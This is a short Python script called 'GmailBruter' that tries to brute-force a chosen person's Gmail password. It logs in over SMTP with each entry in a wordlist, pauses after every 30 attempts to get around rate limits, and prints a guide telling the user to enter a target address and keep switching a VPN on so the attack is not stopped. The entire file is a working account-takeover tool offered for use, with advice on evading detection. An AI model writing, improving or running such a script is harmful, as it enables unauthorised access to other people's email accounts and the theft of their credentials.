import smtplib
import os
import time


print("[+]Loading The Help Guide!")
time.sleep(5)
os.system("clear")
print("--------------------------------------------------")
print("[1]The Script Will Show You A Guide For 15s")
print(" ")
print("[2]Make Sure You Are Connected To The Internet")
print(" ")
print("[3]Enter Target Email Adress")
print(" ")
print("[4]Enter Wordlist Name")
print("        EX: WordList.txt")
print(" ")
print("[5]Turn On VPN After Start GmailBruter To Avoid Stopping The Script")
print("        EX: Psiphon Bro VPN")
print(" ")
print("[6]Wait For Start Brute Force!")
print(" ")
print("[!]Some Notes...")
print("      [*]You Should Put Wordlist In the Same Folder Or Place With Script.")
print("      [*]Turn On The VPN Repeatedly...")
print(" ")
print("[+]For More Scripts Visit My Github Account!")
print("--------------------------------------------------")
time.sleep(15)
os.system("clear")

print("""
                                _________________________________________________
                               |=================================================|
                               |            [Author => Mohamed Dief]             |
                               |=================================================|
                               |              ---------------------              |
                               |              | GmailBruter(V1.0) |              |
                               |              ---------------------              |
                               |                                                 |
                               |[+]Github: github.com/DEMON1A                    |
                               |[+]Facebook: facebook.com/mohamed.dief.1029      |
                               |[+]Twitter: twitter.com/Demon77098812            |
                               |[+]Email: mdaif1332@gmail.com                    |
                               |_________________________________________________|
""")

smtpserver = smtplib.SMTP('smtp.gmail.com', 587)
smtpserver.ehlo()
smtpserver.starttls()
Email = input("[*]Enter Email Adress: ")
PWF = input("[*]Enter Password List Name: ")
PWF = open(PWF, "r")
Num = 0


print(" ")
print("[*]Start Brute Force!")

                                  ###Coded By Mohamed Dief(DEMON1A)###

for Password in PWF:
    try:
        smtpserver.login(Email, Password)
        print("[+]Password Found: {0}".format(Password))
        os.system("clear")
        print("++++++++++++++++++++++++++++++++++++++++++++++++")
        print(" ")
        print("[+]Email Is {0}".format(Email))
        print("[+]Password Is {0}".format(Password))
        print(" ")
        print("[*]Done")
        print("++++++++++++++++++++++++++++++++++++++++++++++++")
        break
    except smtplib.SMTPAuthenticationError:
        print("[!]Password Not Found: {0}".format(Password))
        Num = Num + 1
        if Num == 30:
            time.sleep(7)
            Num = Num - 30

print(" ")
print("[+]For More Scripts Visit My Github Account!")
